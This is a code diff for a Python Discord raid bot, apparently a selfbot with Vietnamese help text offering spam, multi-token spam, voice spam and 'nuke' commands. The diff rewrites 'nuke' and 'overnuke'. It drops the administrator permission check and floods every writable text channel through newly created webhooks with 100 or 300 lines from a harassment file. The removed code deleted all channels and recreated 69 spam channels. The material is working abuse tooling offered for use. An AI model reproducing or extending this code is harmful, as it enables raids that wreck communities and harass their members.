@@ -199,8 +199,8 @@ async def on_command_error(ctx, error):
             "spam": ".spam [delay] [channel_id] [noi_dung] (bo trong channel = kenh hien tai)",
             "nhay": ".nhay [delay] [channel_id] [@user] (bo qua = kenh hien tai, khong tag)",
             "webhook": ".webhook [url] [noi_dung]",
-            "nuke": ".nuke [server] [noi_dung]",
-            "overnuke": ".overnuke [server]",
+            "nuke": ".nuke [server] - xả nhay.txt 100 dòng/tất cả kênh",
+            "overnuke": ".overnuke [server] - xả nhay.txt 300 dòng/tất cả kênh",
             "tokenspam": ".tokenspam [delay] [file/noi_dung]",
             "massreact": ".massreact [so] [emoji]",
             "kick": ".kick [@user]",
@@ -394,15 +394,14 @@ Raid
 
 --- Lệnh Spam ---
 .spam [delay] [channel_id] [noi_dung]  : Spam nội dung với độ trễ
-.nhay [delay] [channel_id]             : Spam từ file nhay.txt
+.nhay [delay] [channel_id] [@user]     : Spam từ file nhay.txt
 .webhook [webhook] [noi_dung]          : Spam qua webhook
 .tokenspam [delay] [noi_dung]          : Spam đa token
 .tokenvc [idvoice]                     : Treo voice đa token
 .vcspam [idvoice]                      : Spam join/leave voice
 .massreact [so_tin_nhan] [emoji]       : Thêm phản ứng hàng loạt
-.bomb                                  : Xóa tất cả channel
-.nuke [server] [noi_dung]              : Xóa và tạo lại server
-.overnuke [server]                     : Overnuke (200 dòng/lần)
+.nuke [server]                         : Xả nhay.txt 100 dòng/tất cả kênh
+.overnuke [server]                     : Xả nhay.txt 300 dòng/tất cả kênh
 .stop                                 : Dừng tất cả
 ```"""
     try:
@@ -1131,8 +1130,7 @@ async def autoreact(ctx, option: str):
         await ctx.send(f"# __{__NAME__}__\n **Lệnh sai, .panel để check**")
 
 @bot.command()
-@commands.has_permissions(administrator=True)
-async def nuke(ctx, server: str, *, message: str):
+async def nuke(ctx, server: str):
     await ctx.message.delete()
     try:
         if server.isdigit():
@@ -1142,28 +1140,33 @@ async def nuke(ctx, server: str, *, message: str):
         if guild is None:
             await ctx.send(f"# __{__NAME__}__\n **Không tìm thấy server: {server}**")
             return
-        await guild.edit(name=message.split()[0] if message else guild.name)
-        for channel in guild.channels:
+        try:
+            with open('cogs/nhay.txt', 'r', encoding='utf-8') as f:
+                nhay_list = [line.strip() for line in f if line.strip()]
+        except FileNotFoundError:
+            await ctx.send(f"# __{__NAME__}__\n **Không tìm thấy nhay.txt**")
+            return
+        await ctx.send(f"# __{__NAME__}__\n **Đang nuke: {guild.name}...**")
+        text_channels = [ch for ch in guild.text_channels if ch.permissions_for(guild.me).send_messages]
+        async def spam_channel(channel, lines):
             try:
-                await channel.delete()
+                webhook = await channel.create_webhook(name="vvnk")
+                for line in lines:
+                    try:
+                        await webhook.send(content=line)
+                    except:
+                        pass
+                    await asyncio.sleep(0.05)
             except Exception as e:
-                print(f"Không thể xóa {channel.name}: {e}")
-        async def spam_webhook(channel, message):
-            webhook = await channel.create_webhook(name="vvnk")
-            count = 0
-            while count < 69:
-                try:
-                    await webhook.send(content=message)
-                    count += 1
-                except Exception as e:
-                    print(f"Lỗi {channel.name}: {e}")
-                await asyncio.sleep(0.5)
-        for i in range(69):
-            channel = await guild.create_text_channel(f"vvnk-{i+1}")
-            bot.loop.create_task(spam_webhook(channel, message))
-        await ctx.send(f"# __{__NAME__}__\n **Nuked server: {guild.name}**")
+                print(f"Loi {channel.name}: {e}")
+        tasks = []
+        for channel in text_channels:
+            lines = [random.choice(nhay_list) for _ in range(100)]
+            tasks.append(spam_channel(channel, lines))
+        await asyncio.gather(*tasks)
+        await ctx.send(f"# __{__NAME__}__\n **Nuked {guild.name} - {len(text_channels)} kenh, 100 dong/kenh**")
     except discord.Forbidden:
-        await ctx.send(f"# __{__NAME__}__\n **Bot lacks permission to nuke server**")
+        await ctx.send(f"# __{__NAME__}__\n **Bot lacks permission**")
     except Exception as e:
         await ctx.send(f"# __{__NAME__}__\n **Error: {e}**")
 
@@ -1178,32 +1181,35 @@ async def overnuke(ctx, server: str):
         if guild is None:
             await ctx.send(f"# __{__NAME__}__\n **Không tìm thấy server: {server}**")
             return
+        try:
+            with open('cogs/nhay.txt', 'r', encoding='utf-8') as f:
+                nhay_list = [line.strip() for line in f if line.strip()]
+        except FileNotFoundError:
+            await ctx.send(f"# __{__NAME__}__\n **Không tìm thấy nhay.txt**")
+            return
         await ctx.send(f"# __{__NAME__}__\n **Đang overnuke: {guild.name}...**")
-        for channel in guild.channels:
+        text_channels = [ch for ch in guild.text_channels if ch.permissions_for(guild.me).send_messages]
+        async def spam_channel_batch(channel, lines, batch_num):
             try:
-                await channel.delete()
+                webhook = await channel.create_webhook(name="vvnk")
+                for line in lines:
+                    try:
+                        await webhook.send(content=line)
+                    except:
+                        pass
+                    await asyncio.sleep(0.05)
             except Exception as e:
-                print(f"Không thể xóa {channel.name}: {e}")
-        async def spam_webhook_batch(channel, lines, delay):
-            webhook = await channel.create_webhook(name="vvnk")
-            for line in lines:
-                try:
-                    await webhook.send(content=line)
-                except Exception as e:
-                    print(f"Lỗi {channel.name}: {e}")
-                await asyncio.sleep(delay)
-        batch_size = 200
-        for i in range(69):
-            channel = await guild.create_text_channel(f"vvnk-{i+1}")
-            lines_batch1 = [f"OVERNUKE {j+1}" for j in range(batch_size)]
-            lines_batch2 = [f"OVERNUKE {j+1}" for j in range(batch_size, batch_size*2)]
-            bot.loop.create_task(spam_webhook_batch(channel, lines_batch1, 0.1))
-            await asyncio.sleep(batch_size * 0.1)
-            bot.loop.create_task(spam_webhook_batch(channel, lines_batch2, 0.1))
-            await asyncio.sleep(batch_size * 0.1)
-        await ctx.send(f"# __{__NAME__}__\n **Overnuked server: {guild.name}**")
+                print(f"Loi {channel.name}: {e}")
+        for batch in range(3):
+            tasks = []
+            for channel in text_channels:
+                lines = [random.choice(nhay_list) for _ in range(100)]
+                tasks.append(spam_channel_batch(channel, lines, batch+1))
+            await asyncio.gather(*tasks)
+            await asyncio.sleep(0.5)
+        await ctx.send(f"# __{__NAME__}__\n **Overnuked {guild.name} - {len(text_channels)} kenh, 300 dong/kenh**")
     except discord.Forbidden:
-        await ctx.send(f"# __{__NAME__}__\n **Bot lacks permission to overnuke server**")
+        await ctx.send(f"# __{__NAME__}__\n **Bot lacks permission**")
     except Exception as e:
         await ctx.send(f"# __{__NAME__}__\n **Error: {e}**")
 
